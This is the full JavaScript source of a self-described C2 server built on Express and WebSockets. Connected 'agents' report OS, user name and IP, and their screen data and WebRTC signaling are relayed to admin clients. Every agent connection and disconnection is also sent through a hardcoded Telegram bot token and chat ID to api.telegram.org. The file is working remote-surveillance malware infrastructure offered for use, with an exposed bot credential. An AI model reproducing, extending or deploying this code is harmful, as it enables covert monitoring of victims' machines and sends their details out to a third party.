const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let clients = {};

app.use(express.static(path.join(__dirname))); 

function notifyTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {}).on('error', (e) => {});
}

wss.on('connection', (ws, req) => {
    // Assign ID based on IP if available, otherwise random UUID
    let id = uuidv4().substr(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Check if this is an admin connecting via browser
    // We'll mark it as admin only when they send the 'register_admin' message
    
    ws.id = id;
    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

    console.log(`[+] Client Connected: ${id} | IP: ${ip}`);

    // Send registration confirmation back to the client
    ws.send(JSON.stringify({ type: 'registered', id: id }));

    // Heartbeat to keep Vercel alive
    let pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(pingInterval);
        }
    }, 25000);

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);

            // Admin Registration
            if (data.type === 'register_admin') {
                clients[id].isAdmin = true;
                console.log(`[ADMIN] Connected with ID: ${id}`);
                return;
            }

            // Agent Info Packet
            if (data.type === 'info') {
                clients[id].info = data;
                clients[id].lastSeen = Date.now();
                
                // Notify all admins
                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                broadcastToAdmin(id, data);

                // Telegram Notification
                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
            } 
            // Forward Signaling Data
            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                forwardToTarget(id, data);
            } 
            // Screen Data / Generic Broadcasts
            else {
                broadcastToAdmin(id, data);
            }
        } catch (e) {
            console.error("Message parsing error:", e);
        }
    });

    ws.on('close', () => {
        delete clients[id];
        notifyAdmin(id, '🔴 User Disconnected');
        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
        console.log(`[-] Client Disconnected: ${id}`);
    });

    ws.on('pong', () => {
        // Keepalive received
    });
});

function notifyAdmin(id, msg) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(id, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`C2 Server running on port ${PORT}`);
});
